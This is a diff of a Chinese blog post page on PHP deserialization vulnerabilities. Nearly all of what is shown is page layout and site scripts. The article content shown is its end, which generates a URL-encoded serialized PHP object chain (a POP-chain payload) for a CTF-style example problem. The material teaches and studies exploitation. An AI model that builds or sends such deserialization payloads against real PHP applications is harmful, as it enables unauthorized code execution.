-  </i>目录
-</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li></ol>
-</div></main>
-            <aside class="left-column">
-              
-              <div class="card card-author">
-                
-  <img 
-    src="/img/logo.png" 
-    class="author-img"
-    width="88"
-    height="88"
-    alt="author avatar">
-
-<p class="author-name">pankas</p>
-<p class="author-description">pankas的小窝</p>
-<div class="author-message">
-  <a 
-    class="author-posts-count" 
-    href="/archives">
-    <span>6</span>
-    <span>文章</span>
-  </a>
-  <a 
-    class="author-categories-count" 
-    href="/categories">
-    <span>3</span>
-    <span>分类</span>
-  </a>
-  <a 
-    class="author-tags-count" 
-    href="/tags">
-    <span>6</span>
-    <span>标签</span>
-  </a>
-</div>
-
-              </div>
-               <div class="sticky-tablet">
-  
-  
-    <article class="display-when-two-columns spacer">
-      <div class="card card-content toc-card">
-        <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>目录
-</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li></ol>
-      </div>
-    </article>
-  
-  
-  <article class="card card-content categories-widget">
-    <div class="categories-card">
-  <div class="categories-header">
-    <i 
-      class="iconfont icon-fenlei" 
-      style="padding-right: 2px;">
-    </i>分类
-  </div>
-  <div class="categories-list">
-    
-      <a href="/categories/CTF-WP/">
-        <div class="categories-list-item">
-          CTF-WP
-          <span class="categories-list-item-badge">4</span>
-        </div>
-      </a>
-    
-      <a href="/categories/%E7%88%AC%E8%99%AB/">
-        <div class="categories-list-item">
-          爬虫
-          <span class="categories-list-item-badge">1</span>
-        </div>
-      </a>
-    
-      <a href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
-        <div class="categories-list-item">
-          web安全基础
-          <span class="categories-list-item-badge">1</span>
-        </div>
-      </a>
-    
-  </div>
-</div>
-  </article>
-  
-  <article class="card card-content tags-widget">
-    <div class="tags-card">
-  <div class="tags-header">
-    <i 
-      class="iconfont icon-biaoqian" 
-      style="padding-right: 2px;">
-    </i>热门标签
-  </div>
-  <div class="tags-list">
-    
-      <a 
-        href="/tags/HGAME/" 
-        title="HGAME">
-        <div class="tags-list-item">HGAME</div>
-      </a>
-    
-      <a 
-        href="/tags/CTF/" 
-        title="CTF">
-        <div class="tags-list-item">CTF</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" 
-        title="反序列化">
-        <div class="tags-list-item">反序列化</div>
-      </a>
-    
-      <a 
-        href="/tags/php/" 
-        title="php">
-        <div class="tags-list-item">php</div>
-      </a>
-    
-      <a 
-        href="/tags/python/" 
-        title="python">
-        <div class="tags-list-item">python</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%88%AC%E8%99%AB/" 
-        title="爬虫">
-        <div class="tags-list-item">爬虫</div>
-      </a>
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
-            <aside class="right-column">
-              <div class="sticky-widescreen">
-  
-  
-    <article class="card card-content toc-card">
-      <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>目录
-</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li></ol>
-    </article>
-  
-  
-  <article class="card card-content">
-    <div class="recent-posts-card">
-  <div class="recent-posts-header">
-    <i 
-      class="iconfont icon-wenzhang_huaban" 
-      style="padding-right: 2px;">
-    </i>最近文章
-  </div>
-  <div class="recent-posts-list">
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-03-01</div>
-        <a href="/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">php反序列化漏洞简单总结</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-02-23</div>
-        <a href="/2022/02/23/baidufanyi-project/"><div class="recent-posts-item-content">记对百度翻译的一次爬虫练习</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-02-17</div>
-        <a href="/2022/02/17/week4-pankas/"><div class="recent-posts-item-content">HGAME 2022 Week4 writeup by pankas</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-02-10</div>
-        <a href="/2022/02/10/week3-pankas/"><div class="recent-posts-item-content">HGAME 2022 Week3 writeup by pankas</div></a>
-      </div>
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
-          </div>
-        </div>
-      </div>
-    </div>
-     
-    <footer class="footer">
-  <div class="footer-container">
-    <div>
-      <div class="footer-dsc">
-        <span>
-          Copyright ©
-          
-            2020 -
-          
-          2022
-        </span>
-        &nbsp;
-        <a 
-          href="/" 
-          class="footer-link">
-          pankas'blog
-        </a>
-      </div>
-    </div>
-
-    
-      <div class="footer-dsc">
-        
-          Powered by
-          <a 
-            href="https://hexo.io/" 
-            class="footer-link" 
-            target="_blank" 
-            rel="nofollow noopener noreferrer">
-            &nbsp;Hexo
-          </a>
-        
-        
-          <span>&nbsp;|&nbsp;</span>
-        
-        
-          Theme -
-          <a 
-            href="https://github.com/theme-kaze" 
-            class="footer-link" 
-            target="_blank"
-            rel="nofollow noopener noreferrer">
-            &nbsp;Kaze
-          </a>
-        
-      </div>
-    
-    
-    
-    
-</footer> 
-    
-  <a 
-    role="button" 
-    id="scrollbutton" 
-    class="basebutton" 
-    aria-label="回到顶部">
-    <i class="iconfont icon-arrowleft button-icon"></i>
-  </a>
-
-<a 
-  role="button" 
-  id="menubutton"
-  aria-label="menu button"
-  class="basebutton">
-  <i class="iconfont icon-menu button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="popbutton" 
-  class="basebutton" 
-  aria-label="控制中心">
-  <i class="iconfont icon-expand button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="darkbutton" 
-  class="basebutton darkwidget" 
-  aria-label="夜色模式">
-  <i class="iconfont icon-weather button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="searchbutton" 
-  class="basebutton searchwidget" 
-  aria-label="搜索">
-  <i class="iconfont icon-search button-icon"></i>
-</a> 
-     
-     
-     
-      <script>
-  var addImgLayout = function () {
-    var img = document.querySelectorAll('.post-content img')
-    var i
-    for (i = 0; i < img.length; i++) {
-      var wrapper = document.createElement('a')
-      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
-      wrapper.setAttribute('aria-label', 'illustration')
-      wrapper.style.cssText =
-        'width: 100%; display: flex; justify-content: center;'
-      if (img[i].alt) wrapper.dataset.caption = img[i].alt
-      wrapper.dataset.nolink = true
-      img[i].before(wrapper)
-      wrapper.append(img[i])
-      var divWrap = document.createElement('div')
-      divWrap.classList.add('gallery')
-      wrapper.before(divWrap)
-      divWrap.append(wrapper)
-    }
-    baguetteBox.run('.gallery')
-  }
-</script>
-<script>
-  loadScript(
-    "/js/lib/lightbox/baguetteBox.min.js",
-    addImgLayout
-  )
-</script>
- 
-     
-     
-    <script src="/js/main.js"></script> 
-     
-    
-      <script>
-        var addLazyload = function () {
-          var observer = lozad('.lozad', {
-            load: function (el) {
-              el.srcset = el.getAttribute('data-src')
-            },
-            loaded: function (el) {
-              el.classList.add('loaded')
-            },
-          })
-          observer.observe()
-        }
-      </script>
-      <script>
-        loadScript('/js/lib/lozad.min.js', addLazyload)
-      </script>
-     
-    
-    
-      <script>
-        setTimeout(() => {localSearch("search.json")}, 0)
-      </script>
-    
-  </body>
-</html>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到payload</p><pre class="line-numbers language-none"><code class="language-none">O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D<span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre></div><div><div class="copyright note-warning post-note" style="margin-top:42px"><p><span style="font-weight:700">作者：</span><a href="/about" rel="nofollow noopener noreferrer" target="_blank"> pankas</a></p><p><span style="font-weight:700">文章链接：</span><a href="https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/" rel="nofollow noopener noreferrer" target="_blank"> https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</a></p><p><span style="font-weight:700">版权声明：</span>转载请注明出处！</p></div></div></article><div class="nav"><div class="nav-item-next"><a href="/2022/02/23/baidufanyi-project/" class="nav-link"><div><div class="nav-label">下一篇</div><div class="nav-title">记对百度翻译的一次爬虫练习</div></div><i class="iconfont icon-right nav-next-icon"></i></a></div></div><div class="card card-content toc-card" id="mobiletoc"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" class="toc-link"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" class="toc-link"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B" class="toc-link"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a href="#%E4%BE%8B%E9%A2%98" class="toc-link"><span class="toc-text">例题</span></a></li></ol></li></ol></div></main><aside class="left-column"><div class="card card-author"><img alt="author avatar" class="author-img" src="/img/logo.png" height="88" width="88"><p class="author-name">pankas</p><p class="author-description">pankas的小窝</p><div class="author-message"><a href="/archives" class="author-posts-count"><span>6</span> <span>文章</span> </a><a href="/categories" class="author-categories-count"><span>3</span> <span>分类</span> </a><a href="/tags" class="author-tags-count"><span>6</span> <span>标签</span></a></div></div><div class="sticky-tablet"><article class="display-when-two-columns spacer"><div class="card card-content toc-card"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" class="toc-link"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" class="toc-link"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B" class="toc-link"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a href="#%E4%BE%8B%E9%A2%98" class="toc-link"><span class="toc-text">例题</span></a></li></ol></li></ol></div></article><article class="card card-content categories-widget"><div class="categories-card"><div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right:2px"></i>分类</div><div class="categories-list"><a href="/categories/CTF-WP/"><div class="categories-list-item">CTF-WP <span class="categories-list-item-badge">4</span></div></a><a href="/categories/%E7%88%AC%E8%99%AB/"><div class="categories-list-item">爬虫 <span class="categories-list-item-badge">1</span></div></a><a href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"><div class="categories-list-item">web安全基础 <span class="categories-list-item-badge">1</span></div></a></div></div></article><article class="card card-content tags-widget"><div class="tags-card"><div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right:2px"></i>热门标签</div><div class="tags-list"><a href="/tags/HGAME/" title="HGAME"><div class="tags-list-item">HGAME</div></a><a href="/tags/CTF/" title="CTF"><div class="tags-list-item">CTF</div></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><div class="tags-list-item">反序列化</div></a><a href="/tags/php/" title="php"><div class="tags-list-item">php</div></a><a href="/tags/python/" title="python"><div class="tags-list-item">python</div></a><a href="/tags/%E7%88%AC%E8%99%AB/" title="爬虫"><div class="tags-list-item">爬虫</div></a></div></div></article></div></aside><aside class="right-column"><div class="sticky-widescreen"><article class="card card-content toc-card"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" class="toc-link"><span class="toc-text">什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%94%E7%A4%BA" class="toc-link"><span class="toc-text">反序列化演示</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" class="toc-link"><span class="toc-text">如何利用反序列化进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A1%88%E4%BE%8B" class="toc-link"><span class="toc-text">简单的案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a href="#%E4%BE%8B%E9%A2%98" class="toc-link"><span class="toc-text">例题</span></a></li></ol></li></ol></article><article class="card card-content"><div class="recent-posts-card"><div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right:2px"></i>最近文章</div><div class="recent-posts-list"><div class="recent-posts-item"><div class="recent-posts-item-title">2022-03-01</div><a href="/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">php反序列化漏洞简单总结</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-02-23</div><a href="/2022/02/23/baidufanyi-project/"><div class="recent-posts-item-content">记对百度翻译的一次爬虫练习</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-02-17</div><a href="/2022/02/17/week4-pankas/"><div class="recent-posts-item-content">HGAME 2022 Week4 writeup by pankas</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-02-10</div><a href="/2022/02/10/week3-pankas/"><div class="recent-posts-item-content">HGAME 2022 Week3 writeup by pankas</div></a></div></div></div></article></div></aside></div></div></div></div><footer class="footer"><div class="footer-container"><div><div class="footer-dsc"><span>Copyright © 2020 - 2022 </span>&nbsp; <a href="/" class="footer-link">pankas'blog</a></div></div><div class="footer-dsc">Powered by <a href="https://hexo.io/" class="footer-link" rel="nofollow noopener noreferrer" target="_blank">&nbsp;Hexo </a><span>&nbsp;|&nbsp;</span> Theme - <a href="https://github.com/theme-kaze" class="footer-link" rel="nofollow noopener noreferrer" target="_blank">&nbsp;Kaze</a></div></div></footer><a class="basebutton" id="scrollbutton" aria-label="回到顶部" role="button"><i class="iconfont button-icon icon-arrowleft"></i> </a><a class="basebutton" id="menubutton" aria-label="menu button" role="button"><i class="iconfont button-icon icon-menu"></i> </a><a class="basebutton" id="popbutton" aria-label="控制中心" role="button"><i class="iconfont button-icon icon-expand"></i> </a><a class="basebutton darkwidget" id="darkbutton" aria-label="夜色模式" role="button"><i class="iconfont button-icon icon-weather"></i> </a><a class="basebutton searchwidget" id="searchbutton" aria-label="搜索" role="button"><i class="iconfont button-icon icon-search"></i></a><script>var addImgLayout=function(){for(var t=document.querySelectorAll(".post-content img"),e=0;e<t.length;e++){var a=document.createElement("a"),l=(a.setAttribute("href",t[e].getAttribute("data-src")),a.setAttribute("aria-label","illustration"),a.style.cssText="width: 100%; display: flex; justify-content: center;",t[e].alt&&(a.dataset.caption=t[e].alt),a.dataset.nolink=!0,t[e].before(a),a.append(t[e]),document.createElement("div"));l.classList.add("gallery"),a.before(l),l.append(a)}baguetteBox.run(".gallery")}</script><script>loadScript("/js/lib/lightbox/baguetteBox.min.js",addImgLayout)</script><script src="/js/main.js"></script><script>var addLazyload=function(){lozad(".lozad",{load:function(a){a.srcset=a.getAttribute("data-src")},loaded:function(a){a.classList.add("loaded")}}).observe()}</script><script>loadScript("/js/lib/lozad.min.js",addLazyload)</script><script>setTimeout(()=>{localSearch("search.json")},0)</script></body></html>
